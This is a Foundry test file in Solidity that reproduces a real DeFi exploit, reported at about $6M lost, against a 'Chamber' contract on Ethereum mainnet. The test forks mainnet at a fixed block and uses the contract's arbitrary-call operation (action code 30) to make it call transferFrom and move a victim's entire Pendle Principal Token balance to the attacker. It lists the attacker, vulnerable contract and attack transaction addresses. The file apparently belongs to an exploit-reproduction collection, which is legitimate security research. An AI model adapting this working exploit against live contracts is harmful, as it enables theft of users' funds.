// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$6M
// Attacker : https://etherscan.io/address/0x94641c01a4937f2c8ef930580cf396142a2942dc
// Vuln Contract : https://etherscan.io/address/0x65c210c59b43eb68112b7a4f75c8393c36491f06
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/eth/0x23fcf9d4517f7cc39815b09b0a80c023ab2c8196c826c93b4100f2e26b701286

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1763045563040411876

interface IChamber {
    function performOperations(
        uint8[] memory actions,
        uint256[] memory values,
        bytes[] memory datas
    ) external payable returns (uint256 value1, uint256 value2);
}

contract ContractTest is Test {
    IChamber private constant Chamber =
        IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
    IERC20 private constant PendlePrincipalToken =
        IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
    address private constant victim =
        0x9CBF099ff424979439dFBa03F00B5961784c06ce;
    uint8 public constant OPERATION_CALL = 30;

    function setUp() public {
        vm.createSelectFork("mainnet", 19325936);
        vm.label(address(Chamber), "Chamber");
        vm.label(address(PendlePrincipalToken), "PendlePrincipalToken");
        vm.label(victim, "victim");
    }

    function testExploit() public {
        // Datas
        uint256 amount = PendlePrincipalToken.balanceOf(victim);
        bytes memory callData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            victim,
            address(this),
            amount
        );
        bytes memory data = abi.encode(
            address(PendlePrincipalToken),
            callData,
            uint256(0),
            uint256(0),
            uint256(0)
        );
        bytes[] memory datas = new bytes[](1);
        datas[0] = data;

        // Actions
        uint8[] memory actions = new uint8[](1);
        actions[0] = OPERATION_CALL;

        // Values
        uint256[] memory values = new uint256[](1);
        values[0] = uint256(0);

        emit log_named_decimal_uint(
            "Exploiter PendlePrincipalToken balance before attack",
            PendlePrincipalToken.balanceOf(address(this)),
            PendlePrincipalToken.decimals()
        );

        Chamber.performOperations(actions, values, datas);

        emit log_named_decimal_uint(
            "Exploiter PendlePrincipalToken balance after attack",
            PendlePrincipalToken.balanceOf(address(this)),
            PendlePrincipalToken.decimals()
        );
    }
}
